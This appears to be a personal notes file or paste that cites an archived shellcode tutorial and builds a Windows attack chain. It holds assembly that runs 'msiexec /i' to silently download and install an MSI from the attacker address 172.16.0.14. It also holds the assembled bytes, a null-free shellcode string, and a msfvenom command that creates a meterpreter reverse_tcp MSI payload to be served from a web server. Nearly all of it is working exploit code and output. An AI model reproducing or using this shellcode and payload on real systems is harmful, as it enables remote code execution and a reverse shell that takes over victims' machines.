https://web.archive.org/web/20120503030935/http://projectshellcode.com/?q=node/12

#Follow above tutorials to output shellcode or follow dudes write-up....I'm sure it works!

#The following asm does this: #

#msiexec /i http*://172.16.0.14/jasonm.msi /qn

#Need to Determine LoadLibrary, ExitProcess & System via Arwin


------------assembly starts---------------

BITS 32


global _start


_start:
			
mov ebx, 0x777fde35      ;Address of function LoadLibraryA (win7)

call ebx

mov ebp, eax             ;msvcrt.dll is saved in ebp

xor eax, eax

PUSH eax

PUSH 0x6e712f20

PUSH 0x69736d2e

PUSH 0x6d6e6f73

PUSH 0x616a2f34

PUSH 0x312e302e

PUSH 0x36312e32

PUSH 0x37312f2f

PUSH 0x3a707474

PUSH 0x6820692f

PUSH 0x20636578

PUSH 0x6569736d

MOV EDI,ESP

PUSH EDI

MOV EAX, 0x768db177		;calling the system()

CALL EAX

xor eax, eax

push eax

mov eax, 0x7780be5a     ; ExitProcess

call eax

--------------assembly end----------------------------------

Save as msi.asm


xvz@xvz-PC ~
$ nasm -f win32 msi.asm -o msi.bin

xvz@xvz-PC ~
$ xxd -i msi.bin
unsigned char msi_bin[] = {
  0x4c, 0x01, 0x01, 0x00, 0x2e, 0x4c, 0x0f, 0x5f, 0x93, 0x00, 0x00, 0x00,
  0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2e, 0x74, 0x65, 0x78,
  0x74, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x57, 0x00, 0x00, 0x00, 0x3c, 0x00, 0x00, 0x00, 0x93, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x50, 0x60,
  0xbb, 0x35, 0xde, 0x7f, 0x77, 0xff, 0xd3, 0x89, 0xc5, 0x31, 0xc0, 0x50,
  0x68, 0x20, 0x2f, 0x71, 0x6e, 0x68, 0x2e, 0x6d, 0x73, 0x69, 0x68, 0x73,
  0x6f, 0x6e, 0x6d, 0x68, 0x34, 0x2f, 0x6a, 0x61, 0x68, 0x2e, 0x30, 0x2e,
  0x31, 0x68, 0x32, 0x2e, 0x31, 0x36, 0x68, 0x2f, 0x2f, 0x31, 0x37, 0x68,
  0x74, 0x74, 0x70, 0x3a, 0x68, 0x2f, 0x69, 0x20, 0x68, 0x68, 0x78, 0x65,
  0x63, 0x20, 0x68, 0x6d, 0x73, 0x69, 0x65, 0x89, 0xe7, 0x57, 0xb8, 0x77,
  0xb1, 0x8d, 0x76, 0xff, 0xd0, 0x31, 0xc0, 0x50, 0xb8, 0x5a, 0xbe, 0x80,
  0x77, 0xff, 0xd0, 0x2e, 0x66, 0x69, 0x6c, 0x65, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0xfe, 0xff, 0x00, 0x00, 0x67, 0x01, 0x6d, 0x73, 0x69,
  0x2e, 0x61, 0x73, 0x6d, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x2e, 0x74, 0x65, 0x78, 0x74, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x03, 0x01, 0x57, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x2e, 0x61, 0x62, 0x73, 0x6f, 0x6c, 0x75, 0x74, 0x00,
  0x00, 0x00, 0x00, 0xff, 0xff, 0x00, 0x00, 0x03, 0x00, 0x40, 0x66, 0x65,
  0x61, 0x74, 0x2e, 0x30, 0x30, 0x01, 0x00, 0x00, 0x00, 0xff, 0xff, 0x00,
  0x00, 0x03, 0x00, 0x04, 0x00, 0x00, 0x00
};

#Get rid of null bytes

xvz@xvz-PC ~
$ ./xxd-shellcode.sh msi.bin

"\xbb\x35\xde\x7f\x77\xff\xd3\x89\xc5\x31\xc0\x50\x68\x20\x2f\x71\x6e\x68\x2e\x6d\x73\x69\x68\x73\x6f\x6e\x6d\x68\x34\x2f\x6a\x61\x68\x2e\x30\x2e\x31\x68\x32\x2e\x31\x36\x68\x2f\x2f\x31\x37\x68\x74\x74\x70\x3a\x68\x2f\x69\x20\x68\x68\x78\x65\x63\x20\x68\x6d\x73\x69\x65\x89\xe7\x57\xb8\x77\xb1\x8d\x76\xff\xd0\x31\xc0\x50\xb8\x5a\xbe\x80\x77\xff\xd0"

#add to script

#Create MSI
#msfvenom -p windows/meterpreter/reverse_tcp LPORT=4444 LHOST=172.16.0.14 -f msi -o jasonm.msi

#Start web-server port 80
